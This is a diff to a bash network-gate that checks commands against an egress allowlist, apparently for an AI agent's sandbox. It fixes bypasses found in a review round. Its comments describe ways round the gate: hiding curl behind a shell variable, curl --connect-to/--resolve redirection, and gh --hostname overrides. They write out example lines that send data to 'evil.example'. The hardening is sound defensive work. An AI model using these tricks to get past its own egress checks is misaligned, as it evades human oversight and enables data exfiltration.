@@ -652,6 +652,16 @@ _inspect_segment() {
       ;;
   esac
 
+  # Codex R6 finding CR6-B: a CLI token containing unresolved shell
+  # expansion (`$c`, `${cmd}`, `` `cmd` ``) means the actual binary is
+  # supplied at runtime — we can't classify it. Fail-CLOSED rather
+  # than fall through to ALLOW (the prior bypass: `c=curl; $c
+  # https://evil.example/exfil` ran curl invisibly).
+  if [[ "$cli" == *\$* || "$cli" == *\`* ]]; then
+    echo "BLOCK: network-gate: command name contains unresolved shell expansion ('$cli') — cannot classify. Failing closed."
+    return 0
+  fi
+
   # After unwrapping, if the resulting CLI looks suspicious (empty, a
   # leftover flag, or still a VAR=val) we cannot make a safe decision.
   # Fail-CLOSED rather than fall through to the catch-all `*) allow`
@@ -663,9 +673,45 @@ _inspect_segment() {
 
   case "$cli" in
     curl|wget)
-      # Extract every URL-like token.
+      # Extract every URL-like token. Also walk for connection-
+      # redirection flags (Codex R6 CR6-A): `--connect-to` and
+      # `--resolve` let curl connect to a host DIFFERENT from the URL,
+      # which bypasses URL-based allowlist checks. The values have the
+      # form `URL_HOST:URL_PORT:CONNECT_HOST:CONNECT_PORT` (--connect-to)
+      # or `URL_HOST:PORT:CONNECT_HOST` (--resolve). The CONNECT_HOST
+      # is the host we must validate.
       local found=0 t host
-      for t in "${tokens[@]:1}"; do
+      local _ci=1
+      while [[ $_ci -lt ${#tokens[@]} ]]; do
+        t="${tokens[$_ci]}"
+        # Spaced or `=` form of --connect-to / --resolve.
+        case "$t" in
+          --connect-to|--resolve)
+            local _rval="${tokens[$((_ci + 1))]:-}"
+            # Extract CONNECT_HOST (3rd colon-separated field for
+            # --connect-to, also 3rd field for --resolve where the value
+            # is HOST:PORT:CONNECT_ADDR).
+            local _chost; _chost="$(printf '%s' "$_rval" | awk -F: 'NF>=3 {print $3}')"
+            if [[ -n "$_chost" ]]; then
+              found=1
+              if ! walter_egress_host_allowed "$_chost"; then
+                echo "BLOCK: network-gate: '$_chost' (curl $t redirected destination) not in egress allowlist. Add via: walter-os egress add '$_chost'"
+                return 0
+              fi
+            fi
+            _ci=$((_ci + 2)); continue ;;
+          --connect-to=*|--resolve=*)
+            local _rval="${t#*=}"
+            local _chost; _chost="$(printf '%s' "$_rval" | awk -F: 'NF>=3 {print $3}')"
+            if [[ -n "$_chost" ]]; then
+              found=1
+              if ! walter_egress_host_allowed "$_chost"; then
+                echo "BLOCK: network-gate: '$_chost' (curl ${t%%=*} redirected destination) not in egress allowlist. Add via: walter-os egress add '$_chost'"
+                return 0
+              fi
+            fi
+            _ci=$((_ci + 1)); continue ;;
+        esac
         if host="$(_host_from_url "$t")" && [[ -n "$host" ]]; then
           found=1
           if ! walter_egress_host_allowed "$host"; then
@@ -673,6 +719,7 @@ _inspect_segment() {
             return 0
           fi
         fi
+        _ci=$((_ci + 1))
       done
       if [[ "$found" -eq 0 ]]; then
         echo "BLOCK: network-gate: '$cli' invoked without an extractable URL host (e.g. '$cli --help'). Run that command outside the agent OR pass a full URL."
@@ -684,9 +731,26 @@ _inspect_segment() {
     gh)
       # gh's default host is github.com unless GH_HOST is set. We use
       # whichever is configured.
+      # Codex R6 CR6-C: `gh api --hostname evil.example …` overrides
+      # GH_HOST on the command line and reaches an unallowlisted host.
+      # Walk tokens for --hostname / -h (`gh api`'s flag; `gh repo
+      # clone` uses --host) and use that value instead.
       local gh_host="${GH_HOST:-github.com}"
+      local _gi=1
+      while [[ $_gi -lt ${#tokens[@]} ]]; do
+        local _gt="${tokens[$_gi]}"
+        case "$_gt" in
+          --hostname|--host)
+            gh_host="${tokens[$((_gi + 1))]:-$gh_host}"
+            _gi=$((_gi + 2)); continue ;;
+          --hostname=*|--host=*)
+            gh_host="${_gt#*=}"
+            _gi=$((_gi + 1)); continue ;;
+        esac
+        _gi=$((_gi + 1))
+      done
       if ! walter_egress_host_allowed "$gh_host"; then
-        echo "BLOCK: network-gate: '$gh_host' (gh default host) not in egress allowlist. Add via: walter-os egress add '$gh_host'"
+        echo "BLOCK: network-gate: '$gh_host' (gh host) not in egress allowlist. Add via: walter-os egress add '$gh_host'"
         return 0
       fi
       echo "ALLOW"
